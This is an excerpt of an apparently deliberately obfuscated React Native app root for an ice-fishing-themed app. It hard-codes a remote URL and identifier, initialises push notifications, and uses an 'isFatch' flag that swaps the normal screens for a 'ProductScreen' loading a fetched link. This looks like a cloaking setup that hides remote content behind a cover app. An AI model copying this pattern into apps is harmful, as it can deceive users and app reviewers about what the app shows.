...
import { GestureHandlerRootView as GlacialGripRealm } from 'react-native-gesture-handler';
import { SafeAreaProvider as CryoSafeHaven } from 'react-native-safe-area-context';
import { NavigationContainer as BorealNavSphere } from '@react-navigation/native';
import { createNativeStackNavigator as AuroraStackAnvil } from '@react-navigation/native-stack';
import ProductScreen from './IceFishObservatorySrc/PolarObersSkrenes/ProductScreen';
import FrostCurrentCore from './IceFishObservatorySrc/PolarObersSkrenes/OsertishWrapIcingCatch';
import PolarIntroDrift from './IceFishObservatorySrc/PolarObersSkrenes/IceFishObservatoryOnboarding';
import ArcticBootVeil from './IceFishObservatorySrc/PolarObersSkrenes/IceFishObservatoryLoading';
...
const CryoRouteSpindle = () => {
  ...
  const SpindleNavigator = DriftStackConstellation.Navigator;

  const auroraTransitions = {
    frostFade: {
      headerShown: false,
      animation: 'fade',
    },
  ...
  {
    /**<SpindleScreen
          name="IceFishObservatoryLoading"
          component={ArcticBootVeil}
          options={{
            title: 'Storm Loading',
            ...auroraTransitions.frostFade,
          }}
        /> */
  }
  ...
  const INITIAL_URL = `https://bright-gate-plus.site/`;
  const URL_IDENTIFAIRE = `KavXYPxA`;
  ...
  OneSignal.initialize('3a373c2e-1e3b-40b4-8dab-8c7c772c2b3f');
  ...
  const Route = ({ isFatch }) => {
    ...
    if (isFatch) {
      return (
        <SpindleNavigator screenOptions={{ headerShown: false }}>
          <SpindleScreen
            initialParams={{
              responseToPushPermition,
              product: finalLink,
    ...
    return (
      <SpindleNavigator
        screenOptions={{
          contentStyle: { backgroundColor: '#ebebebff' },
          animationEnabled: true,
        }}
        initialRouteName="IceFishObservatoryOnboarding"
      >
        <SpindleScreen
          name="OsertishWrapIcingCatch"
          component={FrostCurrentCore}
          options={{
            ...auroraTransitions.frostFade,
        ...
        <SpindleScreen
          name="IceFishObservatoryOnboarding"
          component={PolarIntroDrift}
          options={{
            title: 'Onboard Tubes',
            ...auroraTransitions.iceBlink,
          }}
        />
      </SpindleNavigator>
    );
        ...
        <View style={{ flex: 1, overflow: 'hidden' }}>
          ...
          >
            <Image
              ...
              source={require('./IceFishObservatorySrc/IceFishObservatoryAssets/img/1.png')}
              resizeMode="cover"
            />
            <Image
              style={{ width: screenWidth, height: '100%' }}
              source={require('./IceFishObservatorySrc/IceFishObservatoryAssets/img/2.png')}
              resizeMode="cover"
            />
          </Animated.View>
        </View>
...
export default PolarRootCradle;
